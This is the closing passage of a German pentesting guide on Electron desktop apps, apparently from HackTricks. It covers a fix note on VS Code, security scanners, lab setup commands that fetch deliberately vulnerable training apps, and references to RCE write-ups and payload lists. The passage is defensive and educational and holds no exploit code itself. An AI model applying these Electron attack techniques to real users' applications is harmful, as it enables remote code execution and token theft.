- Die Fixes vom 3. Juni 2026 ergänzten `isTrusted` zu weitergeleiteten Ereignissen, deaktivierten die Weiterleitung nicht vertrauenswürdiger Tastatureingaben in Notebook-Webviews und akzeptierten keinen vom Aufrufer bereitgestellten Installationsbefehlskontext mehr.<sup>[[16]](#references)[[17]](#references)</sup>

## **Werkzeuge**

Die kuratierte Sammlung **awesome-electronjs-hacking** bietet zusätzliche Recherche, Tools und Ressourcen zu verwundbaren Anwendungen.<sup>[[5]](#references)</sup>

- [**Electronegativity**](https://github.com/doyensec/electronegativity) ist ein Tool zum Erkennen von Fehlkonfigurationen und Sicherheits-Anti-Patterns in Electron-basierten Anwendungen.
- [**Electrolint**](https://github.com/ksdmitrieva/electrolint) ist ein Open-Source-VS-Code-Plugin für Electron-Anwendungen, das Electronegativity verwendet.
- [**nodejsscan**](https://github.com/ajinabraham/nodejsscan) prüft auf verwundbare Drittanbieter-Bibliotheken.
- [**Electro.ng**](https://electro.ng/) ist ein kommerzielles Tool zur Sicherheitsanalyse von Electron-Anwendungen.

## Labs

Unter [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s) findest du ein Lab zum Ausnutzen verwundbarer Electron-Apps.<sup>[[4]](#references)</sup>

Mit diesen Befehlen kannst du das Lab durcharbeiten:

```bash
# Download apps from these URLs
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vulnerable to IPC-based RCE
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```

Früher veröffentlichte Adresse für bestehende Lesezeichen: [Electron-Desktop-Apps](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). Die Route zur gesamten Seite leitet hierher weiter; das historische Fragment wird nicht gepflegt.

## References

- [1] [Phishing und Erfassung von Zugangsdaten in Electron-Anwendungen](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
- [2] [Facebook Messenger Desktop App: Beliebiges Lesen von Dateien](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
- [3] [Electron: Ausnutzen fehlender Kontextisolierung - CureCon (en)](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
- [4] [Hacking moderner Desktop-Apps mit XSS und RCE – Workshop](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s)
- [5] [awesome-electronjs-hacking - eine kuratierte Ressourcensammlung zur (Un-)Sicherheit von Electron.js](https://github.com/doyensec/awesome-electronjs-hacking)
- [6] [Missbrauch von Electron-APIs: Die erste Wahl eines Angreifers](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)
- [7] [Electron nodeIntegration RCE-Payloads](https://7as.es/electron/nodeIntegration_rce.txt)
- [8] [1-Klick-RCE in Electron-Anwendungen](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8)
- [9] [Die Gefahren von Electron's shell.openExternal() – viele Wege zu Remote Code Execution](https://benjamin-altpeter.de/shell-openexternal-dangers/)
- [10] [Beliebige URLs zulassen, beliebige Codeausführung erwarten](https://positive.security/blog/url-open-rce#windows-10-19042)
- [11] [RCE in einem bekannten japanischen Chat-Tool mit einem veralteten Electron-Feature erzielen](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)
- [12] [Discord Desktop – RCE](https://blog.electrovolt.io/posts/discord-rce/)
- [13] [Visual Studio Code – RCE im Restricted Mode (CVE-2021-43908)](https://blog.electrovolt.io/posts/vscode-rce/)
- [14] [GitHub-Token-Diebstahl mit einem Klick durch Injektion von Tastaturereignissen in VS-Code-Webviews](https://blog.ammaraskar.com/github-token-stealing)
- [15] [VS-Code-Issue #319593: Webviews können beliebige Tastenkombinationen in der Haupt-Workbench auslösen](https://github.com/microsoft/vscode/issues/319593)
- [16] [VS-Code-PR #319705: Öffnen von Notebooks bestätigen und keinen vom Aufrufer bereitgestellten installExtension-Kontext mehr akzeptieren](https://github.com/microsoft/vscode/pull/319705)
- [17] [VS-Code-PR #319813: Programmatices erneutes Auslösen von keypress/click in Notebook-Webviews blockieren](https://github.com/microsoft/vscode/pull/319813)
- [18] [VS Code 1.89 / Erweiterungen für lokale Arbeitsbereiche](https://code.visualstudio.com/updates/v1_89#_local-workspace-extensions)
- [19] [APPSEC Cali 2018 - MarkDoom: Wie ich in 2 Wochen jede große IDE hackte](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
- [20] [ElectroVolt: Beliebte Desktop-Apps pwnen und dabei neue Angriffsflächen in Electron aufdecken](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [21] [Electron-Sicherheit](https://www.electronjs.org/docs/latest/tutorial/security)
- [22] [Electron BrowserWindow webPreferences](https://www.electronjs.org/docs/latest/api/browser-window#new-browserwindowoptions)
- [23] [REA: Alles reverse engineeren](https://github.com/morluto/rea)
- [24] [Rekonstruktion von JavaScript-Artefakten mit REA](https://github.com/morluto/rea/blob/main/docs/javascript-artifact-reconstruction.md)
- [25] [JavaScript-Anwendungsworkflows über mehrere Ebenen hinweg mit REA](https://github.com/morluto/rea/blob/main/docs/javascript-application-workflows.md)
{{#include ../../banners/hacktricks-training.md}}
